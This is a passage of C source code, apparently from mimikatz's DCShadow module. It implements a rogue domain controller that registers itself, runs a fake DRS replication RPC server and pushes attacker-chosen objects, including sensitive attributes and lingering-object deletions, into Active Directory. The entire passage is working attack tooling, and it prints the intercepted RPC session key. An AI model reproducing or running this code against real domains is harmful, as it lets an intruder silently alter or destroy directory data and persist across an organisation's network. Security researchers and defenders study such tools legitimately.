				{
					if(fManualAddEntry)
					{
						if (kull_m_string_args_byName(argc, argv, L"remotemodify", NULL, NULL))
							pDCShadowDomainInfoInUse->dwPushFlags |= DOMAIN_INFO_PUSH_REMOTE_MODIFY;
						kprintf(L"** Performing AddEntry **\n\n");
						status = kuhl_m_lsadump_dcshadow_AddEntry(pDCShadowDomainInfoInUse);
						if(status != STATUS_SUCCESS)
						{
							PRINT_ERROR(L"unable to perform AddEntry: %08x\n", status);
							// avoid cleaning the request
							pDCShadowDomainInfoInUse->request = NULL;
						}
					}
					else if(fStartServer)
					{
						kprintf(L"** Starting server **\n\n");
						pDCShadowDomainInfoInUse->hGetNCChangeCalled = CreateEvent(NULL, TRUE, FALSE, NULL);
						status = kull_m_rpc_drsr_start_server(pDCShadowDomainInfoInUse->szDomainName, &pDCShadowDomainInfoInUse->mimiDc.InstanceId);
						// not NT_SUCCESS because a server already started return 0x6b1 which is considered as a warning (success)
						if(status != STATUS_SUCCESS)
						{
							PRINT_ERROR(L"unable to start the server: %08x\n", status);
							// avoid cleaning the request
							pDCShadowDomainInfoInUse->request = NULL;
						}
						else
						{
							if(fViewReplicationOnly)
							{
								kprintf(L"== Press Any Key to stop ==\n");
								getchar();
							}
							else
							{
								kprintf(L"== Press Control+C to stop ==\n");
								SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, TRUE);
								WaitForSingleObject(pDCShadowDomainInfoInUse->hGetNCChangeCalled, INFINITE);
								SetConsoleCtrlHandler(kuhl_m_lsadump_dcshadow_control_C, FALSE);
								// wait for the RPC call to complete and the Drs Bind to be close by the DC
								Sleep(500);
							}
							kull_m_rpc_drsr_stop_server();
						}
					}
					else
					{
						BOOL fPropagateLingering = FALSE;
						if(fPush || fManualRegister || fKillViaLingering)
						{
							kprintf(L"** Performing Registration **\n\n");
							status = kuhl_m_lsadump_dcshadow_register(pDCShadowDomainInfoInUse);
							// avoid unregistering a non registered DC
							if(!status && (fPush || fKillViaLingering))
								fManualUnregister = TRUE;
						}
						if(NT_SUCCESS(status) && (fPush || fManualPush ))
						{
							kprintf(L"** Performing Push **\n\n");
							status = kuhl_m_lsadump_dcshadow_push(pDCShadowDomainInfoInUse);
						}
						if (NT_SUCCESS(status) && (fKillViaLingering))
						{
							kprintf(L"** Performing Initial Lingering **\n\n");
							status = kuhl_m_lsadump_dcshadow_lingering_initial(pDCShadowDomainInfoInUse, szObjectToKill);
							fPropagateLingering = (status == STATUS_SUCCESS);
						}
						if(NT_SUCCESS(status) && fManualUnregister)
						{
							kprintf(L"** Performing Unregistration **\n\n");
							status = kuhl_m_lsadump_dcshadow_unregister(pDCShadowDomainInfoInUse);
						}
						if (NT_SUCCESS(status) && fPropagateLingering)
						{
							kprintf(L"** Propagate Lingering **\n\n");
							status = kuhl_m_lsadump_dcshadow_lingering_propagate(pDCShadowDomainInfoInUse, szObjectToKill);
						}
					}
				}
			}
			else PRINT_ERROR(L"no object to push\n");
		}
		else PRINT_ERROR(L"ldap 0x%x (%u)\n", status, status);
		kuhl_m_lsadump_dcshadow_clean_domain_info(pDCShadowDomainInfoInUse);
	}
	pDCShadowDomainInfoInUse = NULL;
	return status;
}

void __RPC_USER SRV_DRS_HANDLE_rundown(DRS_HANDLE hDrs)
{
	if(hDrs)
		midl_user_free(hDrs);
}

// select the lowest version needed (DrsAddEntry v2 and GetNCChange v6)
// higher version implies changes (like adding schemasignature in replication metadata)
ULONG SRV_IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa, DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer, DRS_HANDLE *phDrs)
{
	ULONG status, size;
	/*
	BYTE buffer[256];
	DWORD dwSize = sizeof(buffer);
	DWORD format = 0;
	char hoststr[NI_MAXHOST];
	char portstr[NI_MAXSERV];
	
	if (I_RpcServerInqRemoteConnAddress(rpc_handle, buffer, &dwSize, &format) == STATUS_SUCCESS)
	{
		if (getnameinfo((struct sockaddr *)buffer, dwSize, hoststr, sizeof(hoststr), portstr, sizeof(portstr), NI_NUMERICHOST | NI_NUMERICSERV) == STATUS_SUCCESS)
		{
			kprintf(L"Incoming connection from %S:%S\n", hoststr, portstr);
		}
	}
	*/
	if(pextClient && ppextServer && phDrs && ((PDRS_EXTENSIONS_INT) pextClient)->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
	{
		if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_GETCHGREPLY_V6)
		{
			if(((PDRS_EXTENSIONS_INT) pextClient)->dwFlags & DRS_EXT_STRONG_ENCRYPTION)
			{
				size = ((PDRS_EXTENSIONS_INT) pextClient)->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) ? FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt) : FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid);
				if(*ppextServer = (DRS_EXTENSIONS *) midl_user_allocate(size))
				{
					RtlZeroMemory(*ppextServer, size);
					((PDRS_EXTENSIONS_INT) *ppextServer)->cb = size - sizeof(DWORD);
					((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags = DRS_EXT_BASE | DRS_EXT_RESTORE_USN_OPTIMIZATION | DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD | DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8;
					if(pDCShadowDomainInfoInUse->fUseSchemaSignature)
						((PDRS_EXTENSIONS_INT) *ppextServer)->dwFlags |= DRS_EXT_POST_BETA3;
					if(size >= FIELD_OFFSET(DRS_EXTENSIONS_INT, dwFlagsExt))
						((PDRS_EXTENSIONS_INT) *ppextServer)->dwReplEpoch = (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) ? (((PDRS_EXTENSIONS_INT) pextClient)->dwReplEpoch) : pDCShadowDomainInfoInUse->dwReplEpoch;
				}
				if(*phDrs = MIDL_user_allocate(sizeof(DWORD)))
					*(PDWORD) (*phDrs) = 42;
				status = RPC_S_OK;
			}
			else status = SEC_E_ALGORITHM_MISMATCH;
		}
		else status = ERROR_REVISION_MISMATCH;
	}
	else status = ERROR_INVALID_PARAMETER;
	return status;
}

ULONG SRV_IDL_DRSUnbind(DRS_HANDLE *phDrs)
{
	if(phDrs && *phDrs)
	{
		MIDL_user_free(*phDrs);
		*phDrs = NULL;
	}
	return STATUS_SUCCESS;
}

// called by the remote DC and where the object is pushed
ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHGREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_GETCHGREPLY *pmsgOut)
{
	ULONG status, i;
	RPC_BINDING_HANDLE hBinding;
	PCtxtHandle data = NULL;
	SecPkgContext_SessionKey SessionKey = {0};
	BOOL isSensitive = TRUE;
	PSID pSid = NULL;
	FILETIME ft;
	REPLENTINFLIST **pCurrentReplObject;
	
	if(dwInVersion == 8)
	{
		GetSystemTimeAsFileTime(&ft);
		kprintf(L"  cMaxObjects : %u\n", pmsgIn->V8.cMaxObjects);
		kprintf(L"  cMaxBytes   : 0x%08x\n", pmsgIn->V8.cMaxBytes);
		kprintf(L"  ulExtendedOp: %u\n", pmsgIn->V8.ulExtendedOp);

		if(pmsgIn->V8.pNC)
		{
			kprintf(L"  pNC->Guid: ");
			kull_m_string_displayGUID(&pmsgIn->V8.pNC->Guid);
			kprintf(L"\n");
			if(pmsgIn->V8.pNC->SidLen)
			{
				kprintf(L"  pNC->Sid : ");
				kull_m_string_displaySID(&pmsgIn->V8.pNC->Sid);
				kprintf(L"\n");
			}
			if(pmsgIn->V8.pNC->NameLen)
				kprintf(L"  pNC->Name: %s\n", pmsgIn->V8.pNC->StringName);

			*pdwOutVersion = 6;
			pmsgOut->V6.uuidDsaObjSrc = pDCShadowDomainInfoInUse->mimiDc.InstanceId;
			pmsgOut->V6.uuidInvocIdSrc = pDCShadowDomainInfoInUse->mimiDc.InvocationId;
			if(pmsgOut->V6.pNC = (DSNAME *) MIDL_user_allocate(pmsgIn->V8.pNC->structLen))
				RtlCopyMemory(pmsgOut->V6.pNC, pmsgIn->V8.pNC, pmsgIn->V8.pNC->structLen);
			RtlZeroMemory(&pmsgOut->V6.usnvecFrom, sizeof(USN_VECTOR));
			pmsgOut->V6.usnvecTo.usnHighObjUpdate = pmsgOut->V6.usnvecTo.usnHighPropUpdate = pDCShadowDomainInfoInUse->maxDCUsn;
			pmsgOut->V6.usnvecTo.usnReserved = 0;
			if(pmsgOut->V6.pUpToDateVecSrc = (UPTODATE_VECTOR_V2_EXT *) MIDL_user_allocate(sizeof(UPTODATE_VECTOR_V2_EXT))) // 1 included
			{
				pmsgOut->V6.pUpToDateVecSrc->dwVersion = 2;
				pmsgOut->V6.pUpToDateVecSrc->dwReserved1 = 0;
				pmsgOut->V6.pUpToDateVecSrc->cNumCursors = 1;
				pmsgOut->V6.pUpToDateVecSrc->dwReserved2 = 0;

				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].uuidDsa = pDCShadowDomainInfoInUse->mimiDc.InstanceId;
				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].usnHighPropUpdate = pDCShadowDomainInfoInUse->maxDCUsn;
				pmsgOut->V6.pUpToDateVecSrc->rgCursors[0].timeLastSyncSuccess = (*(PULONGLONG) &ft) / 10000;
			}

			RtlZeroMemory(&pmsgOut->V6.PrefixTableSrc, sizeof(SCHEMA_PREFIX_TABLE));
			pmsgOut->V6.ulExtendedRet = 0x00000001; //EXOP_ERR_SUCCESS
			pmsgOut->V6.cNumObjects = (pDCShadowDomainInfoInUse->request? pDCShadowDomainInfoInUse->request->cNumObjects : 0);
			pmsgOut->V6.cNumBytes = 0; // srly ???
			
			if(hBinding = I_RpcGetCurrentCallHandle())
			{
				status = I_RpcBindingInqSecurityContext(hBinding, (LPVOID *) &data);
				if(status == RPC_S_OK)
				{
					status = QueryContextAttributes(data, SECPKG_ATTR_SESSION_KEY, &SessionKey);
					if(status == SEC_E_OK)
					{
						kprintf(L"SessionKey: ");
						kull_m_string_wprintf_hex(SessionKey.SessionKey, SessionKey.SessionKeyLength, 0);
						kprintf(L"\n");
					}
				}
			}

			kuhl_m_lsadump_dcshadow_init_prefixtable(&pmsgOut->V6.PrefixTableSrc);

			pCurrentReplObject = &pmsgOut->V6.pObjects;
			for(i = 0; i < pmsgOut->V6.cNumObjects; i++)
			{
				if(kuhl_m_lsadump_dcshadow_object_to_replentinflist(pDCShadowDomainInfoInUse, pCurrentReplObject, pDCShadowDomainInfoInUse->request->pObjects + i, &pmsgOut->V6.PrefixTableSrc, &ft))
				{
					if(SessionKey.SessionKey)
						kuhl_m_lsadump_dcshadow_encode_sensitive(*pCurrentReplObject, pDCShadowDomainInfoInUse->request->pObjects + i, &SessionKey);
					pCurrentReplObject = &((*pCurrentReplObject)->pNextEntInf);
				}
			}

			if(pDCShadowDomainInfoInUse->fUseSchemaSignature)
			{
				PrefixTableEntry* entries;
				if(entries = (PrefixTableEntry *) MIDL_user_allocate(sizeof(PrefixTableEntry) * (pmsgOut->V6.PrefixTableSrc.PrefixCount+1)))
				{
					RtlCopyMemory(entries, pmsgOut->V6.PrefixTableSrc.pPrefixEntry, sizeof(PrefixTableEntry) * (pmsgOut->V6.PrefixTableSrc.PrefixCount));
					entries[pmsgOut->V6.PrefixTableSrc.PrefixCount].ndx = 0;
					entries[pmsgOut->V6.PrefixTableSrc.PrefixCount].prefix.length = 21;
					if(entries[pmsgOut->V6.PrefixTableSrc.PrefixCount].prefix.elements = (PBYTE) MIDL_user_allocate(21))
					{
						RtlCopyMemory(entries[pmsgOut->V6.PrefixTableSrc.PrefixCount].prefix.elements, pDCShadowDomainInfoInUse->pbSchemaSignature, 21);
						if(pmsgOut->V6.PrefixTableSrc.pPrefixEntry)
							MIDL_user_free(pmsgOut->V6.PrefixTableSrc.pPrefixEntry);
						pmsgOut->V6.PrefixTableSrc.pPrefixEntry = entries;
						pmsgOut->V6.PrefixTableSrc.PrefixCount++;
					}
				}
			}

			pmsgOut->V6.fMoreData = FALSE;
			pmsgOut->V6.cNumNcSizeObjects = 0;
			pmsgOut->V6.cNumNcSizeValues = 0;
			pmsgOut->V6.cNumValues = 0;
			pmsgOut->V6.rgValues = NULL;
			pmsgOut->V6.dwDRSError = 0;

			if(SessionKey.SessionKey)
				FreeContextBuffer(SessionKey.SessionKey);

			kprintf(L"%u object(s) pushed\n", pmsgOut->V6.cNumObjects);
			if (pmsgOut->V6.cNumObjects)
				SetEvent(pDCShadowDomainInfoInUse->hGetNCChangeCalled);
		}
		status = STATUS_SUCCESS;
	}
	else status = ERROR_REVISION_MISMATCH;
	return status;
}

ULONG SRV_IDL_DRSVerifyNames(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_VERIFYREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_VERIFYREPLY *pmsgOut)
{
	DWORD i;
	if (dwInVersion != 1)
		return ERROR_REVISION_MISMATCH;
	for(i = 0 ; i <pmsgIn->V1.cNames; i++)
	{
		kprintf(L"  Verify Name for: %s\n", pmsgIn->V1.rpNames[i]->StringName);
	}
	*pdwOutVersion = 1;
	ZeroMemory(pmsgOut, sizeof(DRS_MSG_VERIFYREPLY));
	pmsgOut->V1.error = 0;
	pmsgOut->V1.cNames = pmsgIn->V1.cNames;
	pmsgOut->V1.rpEntInf = (ENTINF*)MIDL_user_allocate(sizeof(ENTINF) * pmsgIn->V1.cNames);
	ZeroMemory(pmsgOut->V1.rpEntInf, sizeof(ENTINF) * pmsgIn->V1.cNames);
    return ERROR_SUCCESS;
}

// this function is here to acknowledge that we add a DC in our own replication list
// needed or the remote DC will log the error
ULONG SRV_IDL_DRSUpdateRefs(DRS_HANDLE hDrs, DWORD dwVersion, DRS_MSG_UPDREFS *pmsgUpdRefs)
{
	return STATUS_SUCCESS;
}